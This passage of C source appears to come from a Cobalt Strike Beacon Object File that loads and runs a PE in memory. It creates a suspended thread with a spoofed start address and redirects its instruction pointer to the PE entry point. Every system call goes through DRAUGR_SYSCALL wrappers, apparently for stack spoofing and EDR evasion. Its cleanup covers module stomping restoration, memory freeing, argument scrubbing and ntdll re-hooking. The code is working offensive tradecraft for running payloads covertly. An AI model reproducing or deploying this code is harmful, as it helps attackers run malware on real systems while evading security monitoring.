        BeaconPrintf(CALLBACK_OUTPUT, "Thread spoof start addr : %p", pStartFunction);
        BeaconPrintf(CALLBACK_OUTPUT, "\n\nAllocated Memory for PE : %p\nAddr of entry point : %d\nPE Start Address : %p\n", MemoryPeAddress, Ntheaders->OptionalHeader.AddressOfEntryPoint, pPeStartAddress);
#endif

        /* ------------------------
                RUN
        ------------------------ */

        Status = DRAUGR_SYSCALL(NtCreateThreadEx,
                                &hThread,
                                THREAD_ALL_ACCESS,
                                NULL,
                                NtCurrentProcess,
                                pStartFunction,
                                NULL,
                                THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
                                0,
                                0,
                                0,
                                NULL);

        if (NT_ERROR(Status))
        {
            BeaconPrintf(CALLBACK_ERROR, "Can't create thread ! Status : 0x%llx", Status);
            break;
        }

#ifdef _DEBUG
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Thread created with success ! HANDLE : %x", hThread);
        }
#endif

        Ctx.ContextFlags = CONTEXT_ALL;
        Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
        if (NT_ERROR(Status))
        {
            BeaconPrintf(CALLBACK_ERROR, "Can't get the thread context context ! Status : 0x%llx", Status);
            break;
        }

        Ctx.Rip = pPeStartAddress;
        Ctx.ContextFlags = CONTEXT_ALL;

        Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
        if (NT_ERROR(Status))
        {
            BeaconPrintf(CALLBACK_ERROR, "Can't set the thread context context ! Status : 0x%llx", Status);
            break;
        }

        Status = DRAUGR_SYSCALL(NtResumeThread, hThread, NULL);
        if (NT_ERROR(Status))
        {
            BeaconPrintf(CALLBACK_ERROR, "Can't resume thread ! Status : 0x%llx", Status);
            break;
        }

        if (Config.Timeout == 0)
        {
            Status = DRAUGR_SYSCALL(NtWaitForSingleObject, hThread, FALSE, NULL);
        }
        else
        {
            MsToLargeInteger(Config.Timeout, &lTimeout);
            Status = DRAUGR_SYSCALL(NtWaitForSingleObject, hThread, FALSE, &lTimeout);

            if (Status == STATUS_TIMEOUT)
            {
                BeaconPrintf(CALLBACK_ERROR, "[!] Thread timeout after %d seconds", Config.Timeout / 1000);
                DRAUGR_SYSCALL(NtTerminateThread, hThread, STATUS_SUCCESS);
            }
        }

    } while (FALSE);

    /* ------------------------
       CLEANUP PE
    ------------------------ */

    SIZE_T RegionSize = 0;

    if (hThread)
    {
        DRAUGR_SYSCALL(NtClose, hThread);
    }

    switch (Config.Allocation)
    {
        case (ALLOC_VIRTUALALLOC):
        {
            DRAUGR_SYSCALL(NtFreeVirtualMemory, NtCurrentProcess, &MemoryPeAddress, &RegionSize, MEM_RELEASE);
            break;
        }

        case (ALLOC_HEAP):
        {

            PVOID pRtlDestroyHeap = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlDestroyHeap");
            PVOID pRtlValidateHeap = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlValidateHeap");

            if (!pRtlDestroyHeap || !pRtlValidateHeap)
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "Can't resolve address in heap cleanup !");
#endif
                break;
            }

            if (g_Heap && DRAUGR_API(pRtlValidateHeap, g_Heap, 0, NULL)) {
                DRAUGR_API(pRtlDestroyHeap, g_Heap);
                g_Heap = NULL;
            }
#ifdef _DEBUG
            else {
                BeaconPrintf(CALLBACK_ERROR, "Heap is invalid ! The PE in memory will be not free");
            }
#endif
            break;
        }

        case (ALLOC_STOMPING):
        {
            ULONG uOldProtect = 0;
            PVOID pMemoryAddress = Config.RestoreStomping.ModuleAddress;
            RegionSize = Config.RestoreStomping.ContentSize;

            Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess, &pMemoryAddress, &RegionSize, PAGE_READWRITE, &uOldProtect);

            if (NT_ERROR(Status))
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't change memory protection: 0x%llx", Status);
#endif
                break;
            }

            _memcpy(Config.RestoreStomping.ModuleAddress, Config.RestoreStomping.OriginalContent, Config.RestoreStomping.ContentSize);

            pMemoryAddress = Config.RestoreStomping.ModuleAddress;
            RegionSize = Config.RestoreStomping.ContentSize;

            ULONG uTempProtect = 0;
            Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess, &pMemoryAddress, &RegionSize, uOldProtect, &uTempProtect);
            if (NT_ERROR(Status))
            {
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't restore memory protection: 0x%llx", Status);
                break;
            }

            RegionSize = 0;
            DRAUGR_SYSCALL(NtFreeVirtualMemory, NtCurrentProcess, &Config.RestoreStomping.OriginalContent, &RegionSize, MEM_RELEASE);

            PVOID pFreeLibrary = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "FreeLibrary");
            HMODULE hStompModule = GetModuleHandleA((LPSTR)Config.StompModule);

            if (pFreeLibrary && hStompModule)
            {
                DRAUGR_API(pFreeLibrary, hStompModule);
            }

            break;
        }

        default:
        {
            break;
        }
    }

    if (ArgsCmdA)
    {
        for (int i = 0; i < LenArg; i++)
        {
            if (ArgsCmdA[i])
            {
                _memset(ArgsCmdA[i], 0, StrLenA(ArgsCmdA[i])); 
                free(ArgsCmdA[i]);
            }
        }
        free(ArgsCmdA);
        ArgsCmdA = NULL;
    }

    if (ArgsCmdW)
    {
        for (int i = 0; i < LenArg; i++)
        {
            if (ArgsCmdW[i])
            {
                _memset(ArgsCmdW[i], 0, StrLenW(ArgsCmdW[i]) * sizeof(wchar_t));
                free(ArgsCmdW[i]);
            }
        }
        free(ArgsCmdW);
        ArgsCmdW = NULL;
    }

  
    if (g_ArgsW)
    {
        _memset(g_ArgsW, 0, StrLenW(g_ArgsW) * sizeof(wchar_t));
        free(g_ArgsW);
        g_ArgsW = NULL;
    }

    LenArg = 0;

    if (Config.UnhookNtdll && UnhookNtdll.pOriginalContent) {   
        RestoreModuleHooks(&UnhookNtdll);
    }
}